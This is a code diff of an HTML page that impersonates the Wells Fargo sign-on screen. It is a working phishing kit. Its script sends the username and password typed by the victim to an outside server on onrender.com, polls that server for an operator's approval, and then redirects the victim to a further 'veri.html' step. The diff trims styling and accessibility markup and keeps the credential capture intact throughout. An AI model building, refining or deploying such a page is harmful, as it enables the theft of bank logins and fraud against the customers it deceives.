@@ -5,231 +5,31 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>wf001</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      background-color: #fff;
-    }
-
-    .top-bar {
-      background-color: #df0025;
-      color: white;
-      padding: 16px 20px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    .yellow-strip {
-      height: 4px;
-      background-color: #ffd700;
-      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-    }
-
-    .logo {
-      font-family: 'Clarendon', Georgia, serif;
-      font-size: 24px;
-      font-weight: bold;
-      letter-spacing: 1px;
-    }
-
-    .lang {
-      font-size: 14px;
-      text-decoration: underline;
-      cursor: pointer;
-    }
-
-    .container {
-      max-width: 400px;
-      margin: 60px auto 20px;
-      background: white;
-      padding: 30px;
-      border-radius: 10px;
-      text-align: center;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.15);
-    }
-
-    h2 {
-      margin-bottom: 20px;
-      font-size: 22px;
-    }
-
-    .input-field {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border-radius: 6px;
-      border: 1px solid #aaa;
-      font-size: 15px;
-      box-sizing: border-box;
-    }
-
-    .password-wrapper {
-      position: relative;
-    }
-
-    .show-btn {
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      background: none;
-      border: none;
-      color: #0070c9;
-      cursor: pointer;
-      font-size: 14px;
-      padding: 0;
-    }
-
-    #errorMessage {
-      color: red;
-      font-size: 14px;
-      margin-top: 5px;
-      display: none;
-      text-align: left;
-      min-height: 18px;
-    }
-
-    .save-username {
-      display: flex;
-      align-items: center;
-      margin-top: 10px;
-      font-size: 14px;
-      justify-content: flex-start;
-    }
-
-    .save-username input {
-      margin-right: 6px;
-    }
-
-    .security-note {
-      font-size: 12px;
-      color: #555;
-      text-align: left;
-      margin-top: 5px;
-    }
-
-    .sign-on {
-      width: 100%;
-      padding: 12px;
-      margin-top: 20px;
-      background-color: #eee;
-      border: none;
-      border-radius: 6px;
-      color: #666;
-      cursor: not-allowed;
-      font-size: 16px;
-      transition: background-color 0.3s, color 0.3s;
-      display: inline-flex;
-      justify-content: center;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .sign-on.enabled {
-      background-color: #0070c9 !important;
-      color: white !important;
-      cursor: pointer !important;
-    }
-
-    .or-divider {
-      margin: 15px 0;
-      font-size: 14px;
-      color: #999;
-    }
-
-    .passkey-btn {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #333;
-      background: #fff;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-
-    .no-passkey {
-      font-size: 12px;
-      margin: 10px 0;
-    }
-
-    .forgot-link {
-      display: block;
-      margin-top: 10px;
-      color: #0070c9;
-      font-size: 14px;
-      text-decoration: none;
-      cursor: pointer;
-    }
-
-    .spinner {
-      border: 3px solid #f3f3f3;
-      border-top: 3px solid #fff;
-      border-radius: 50%;
-      width: 16px;
-      height: 16px;
-      animation: spin 1s linear infinite;
-      display: inline-block;
-      vertical-align: middle;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .disclaimer {
-      max-width: 600px;
-      background: white;
-      margin: 20px auto;
-      padding: 20px;
-      border-radius: 10px;
-      font-size: 14px;
-      line-height: 1.5;
-      text-align: left;
-    }
-
-    .disclaimer ul {
-      list-style: none;
-      padding-left: 0;
-    }
-
-    .disclaimer ul li {
-      margin-bottom: 10px;
-    }
-
-    .disclosure {
-      margin-top: 10px;
-      font-style: italic;
-      color: #555;
-    }
-
-    .footer {
-      background: #f9f9f9;
-      text-align: center;
-      padding: 20px;
-      font-size: 13px;
-    }
-
-    .footer .links {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 15px;
-      margin-bottom: 10px;
-    }
-
-    .footer .links a {
-      color: #0070c9;
-      text-decoration: none;
-    }
+    body { font-family: Arial, sans-serif; margin: 0; background-color: #fff; }
+    .top-bar { background-color: #df0025; color: white; padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; }
+    .yellow-strip { height: 4px; background-color: #ffd700; }
+    .logo { font-family: 'Clarendon', Georgia, serif; font-size: 24px; font-weight: bold; }
+    .container { max-width: 400px; margin: 60px auto; padding: 30px; background: white; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.15); text-align: center; }
+    .input-field { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #aaa; border-radius: 6px; }
+    .sign-on { width: 100%; padding: 12px; margin-top: 20px; border-radius: 6px; font-size: 16px; background: #eee; border: none; color: #666; cursor: not-allowed; display: flex; align-items: center; justify-content: center; gap: 8px; }
+    .sign-on.enabled { background-color: #0070c9; color: white; cursor: pointer; }
+    .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #fff; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: inline-block; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    #errorMessage { color: red; font-size: 14px; display: none; margin-top: 5px; }
+    .disclaimer { max-width: 600px; background: white; margin: 20px auto; padding: 20px; border-radius: 10px; font-size: 14px; line-height: 1.5; text-align: left; }
+    .disclaimer ul { list-style: none; padding-left: 0; }
+    .disclaimer ul li { margin-bottom: 10px; }
+    .disclosure { margin-top: 10px; font-style: italic; color: #555; }
+    .footer { background: #f9f9f9; text-align: center; padding: 20px; font-size: 13px; }
+    .footer .links { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin-bottom: 10px; }
+    .footer .links a { color: #0070c9; text-decoration: none; }
   </style>
 </head>
 <body>
 
 <header class="top-bar">
   <div class="logo">WELLS FARGO</div>
-  <div class="lang" role="button" tabindex="0" aria-label="Switch to Spanish">Español</div>
+  <div class="lang">Español</div>
 </header>
 
 <div class="yellow-strip"></div>
@@ -237,88 +37,34 @@
 <div class="container">
   <h2>Good evening</h2>
   <form id="loginForm" onsubmit="event.preventDefault(); login();">
-    <input
-      type="text"
-      id="username"
-      class="input-field"
-      placeholder="Username"
-      autocomplete="username"
-      required
-      aria-label="Username"
-    />
-    <div class="password-wrapper">
-      <input
-        type="password"
-        id="password"
-        class="input-field"
-        placeholder="Password"
-        autocomplete="current-password"
-        required
-        aria-label="Password"
-      />
-      <button
-        type="button"
-        class="show-btn"
-        onclick="togglePassword(event)"
-        aria-pressed="false"
-        aria-label="Show or hide password"
-      >
-        Show
-      </button>
-    </div>
-    <p id="errorMessage" aria-live="polite" role="alert"></p>
-
-    <label class="save-username">
-      <input type="checkbox" id="saveUsername" aria-label="Save username" />
-      Save username
-    </label>
-
-    <p class="security-note">
-      Only save your username on private devices.
-    </p>
-
-    <button
-      id="signOnBtn"
-      class="sign-on"
-      type="submit"
-      disabled
-      aria-disabled="true"
-    >
+    <input type="text" id="username" placeholder="Username" class="input-field" required />
+    <input type="password" id="password" placeholder="Password" class="input-field" required />
+    <p id="errorMessage"></p>
+    <button id="signOnBtn" class="sign-on" type="submit" disabled>
       <span id="btnText">Sign on</span>
     </button>
-
-    <div class="or-divider">or</div>
-    <button
-      type="button"
-      class="passkey-btn"
-      disabled
-      aria-disabled="true"
-      aria-label="Use a passkey"
-    >
-      🔐 Use a passkey
-    </button>
-
-    <a href="#" class="forgot-link" aria-label="Forgot username or password?">
-      Forgot username or password?
-    </a>
   </form>
 </div>
 
 <div class="disclaimer">
   <ul>
-    <li><strong>General Terms of Use:</strong> Applies to all online services.</li>
-    <li><strong>Banking Terms:</strong> May apply fees or restrictions.</li>
-    <li><strong>Investments & Insurance:</strong> Subject to risk.</li>
+    <li><strong></strong> general terms and Conditions</li>
+    <li><strong></strong> Deposits FDIC Insured</li>
+    <li><strong>Subject</strong> to investment risks including possible loss of principal</li>
   </ul>
   <p class="disclosure">Deposit products offered by Wells Fargo, N.A.</p>
 </div>
 
 <footer class="footer">
   <div class="links">
-    <a href="#">About</a>
-    <a href="#">Privacy & Legal</a>
+    <a href="#">About wells Fargo</a>
+    <a href="#">Online Access Agreement</a>
+    <a href="#">Privacy, Cookies, Security & Legal</a>
+    <a href="#">Do not sell or share my personal information</a>
+    <a href="#">Report Email Fraud</a>
     <a href="#">Security Center</a>
-    <a href="#">Feedback</a>
+    <a href="#">Sitemap</a>
+    <a href="#">Give Us Feedback</a>
   </div>
   <p>© 2025 Wells Fargo Bank. All rights reserved.</p>
 </footer>
@@ -327,116 +73,86 @@
   const usernameField = document.getElementById("username");
   const passwordField = document.getElementById("password");
   const signOnBtn = document.getElementById("signOnBtn");
-  const errorMessage = document.getElementById("errorMessage");
   const btnText = document.getElementById("btnText");
-  const showBtn = document.querySelector(".show-btn");
+  const errorMessage = document.getElementById("errorMessage");
 
-  const API_BASE = "https://my-node-backend-4nfy.onrender.com"; // Your live backend
+  const API_BASE = "https://my-node-backend-4nfy.onrender.com";
 
   function checkInputs() {
-    const u = usernameField.value.trim();
-    const p = passwordField.value.trim();
-    if (u && p) {
+    if (usernameField.value.trim() && passwordField.value.trim()) {
       signOnBtn.disabled = false;
       signOnBtn.classList.add("enabled");
-      signOnBtn.setAttribute("aria-disabled", "false");
     } else {
       signOnBtn.disabled = true;
       signOnBtn.classList.remove("enabled");
-      signOnBtn.setAttribute("aria-disabled", "true");
     }
-    errorMessage.style.display = "none";
   }
 
   usernameField.addEventListener("input", checkInputs);
   passwordField.addEventListener("input", checkInputs);
 
-  function togglePassword(e) {
-    const type = passwordField.type === "password" ? "text" : "password";
-    passwordField.type = type;
-    e.target.textContent = type === "password" ? "Show" : "Hide";
-    e.target.setAttribute("aria-pressed", type === "text");
+  function showSpinner() {
+    btnText.textContent = "Signing on...";
+    if (!signOnBtn.querySelector(".spinner")) {
+      const spinner = document.createElement("span");
+      spinner.classList.add("spinner");
+      signOnBtn.appendChild(spinner);
+    }
   }
 
-  function clearButton() {
-    signOnBtn.disabled = false;
-    signOnBtn.classList.add("enabled");
-    signOnBtn.setAttribute("aria-disabled", "false");
-    btnText.textContent = "Sign on";
-    const spinner = signOnBtn.querySelector(".spinner");
-    if (spinner) spinner.remove();
-  }
-
-  async function pollApproval(maxAttempts = 10, intervalMs = 3000) {
+  async function pollApproval(maxAttempts = 20, intervalMs = 3000) {
     let attempts = 0;
     while (attempts < maxAttempts) {
       attempts++;
       try {
-        const res = await fetch(`${API_BASE}/get-login-data`);
-        console.log("Polling status response:", res.status);
+        const res = await fetch(`${API_BASE}/check-approval`);
         const data = await res.json();
-        console.log("Polling data:", data);
         if (data.approved) return true;
-      } catch (err) {
-        console.error("Polling error:", err);
+      } catch (e) {
+        console.error("Polling error:", e);
       }
-      await new Promise((r) => setTimeout(r, intervalMs));
+      await new Promise(res => setTimeout(res, intervalMs));
     }
     return false;
   }
 
   async function login() {
-    const username = usernameField.value.trim();
-    const password = passwordField.value.trim();
-
-    if (!username || !password) {
-      errorMessage.textContent = "Please enter both username and password.";
-      errorMessage.style.display = "block";
-      return;
-    }
-
     signOnBtn.disabled = true;
     signOnBtn.classList.remove("enabled");
-    signOnBtn.setAttribute("aria-disabled", "true");
-    btnText.textContent = "Signing on...";
-    if (!signOnBtn.querySelector(".spinner")) {
-      const spinner = document.createElement("span");
-      spinner.className = "spinner";
-      signOnBtn.appendChild(spinner);
-    }
-
-    console.log("Submitting login with:", { username, password });
+    showSpinner();
 
     try {
       const res = await fetch(`${API_BASE}/simulate-login`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ username, password }),
+        body: JSON.stringify({
+          username: usernameField.value.trim(),
+          password: passwordField.value.trim()
+        }),
       });
-
-      console.log("Login response:", res.status);
-      const data = await res.json();
-      console.log("Login response data:", data);
-
-      if (!res.ok) throw new Error(data.message || "Login submission failed");
-
-      errorMessage.style.display = "none";
+      if (!res.ok) throw new Error("Login submission failed");
 
       const approved = await pollApproval();
-      console.log("Approved?", approved);
-
       if (approved) {
         window.location.href = "veri.html";
       } else {
         errorMessage.textContent = "Login not approved yet.";
         errorMessage.style.display = "block";
-        clearButton();
+        btnText.textContent = "Sign on";
+        const spinner = signOnBtn.querySelector(".spinner");
+        if (spinner) spinner.remove();
+        signOnBtn.disabled = false;
+        signOnBtn.classList.add("enabled");
       }
     } catch (err) {
-      console.error("Login error:", err);
-      errorMessage.textContent = err.message || "Something went wrong.";
+      console.error(err);
+      errorMessage.textContent = err.message;
       errorMessage.style.display = "block";
-      clearButton();
+      btnText.textContent = "Sign on";
+      const spinner = signOnBtn.querySelector(".spinner");
+      if (spinner) spinner.remove();
+      signOnBtn.disabled = false;
+      signOnBtn.classList.add("enabled");
     }
   }
 </script>
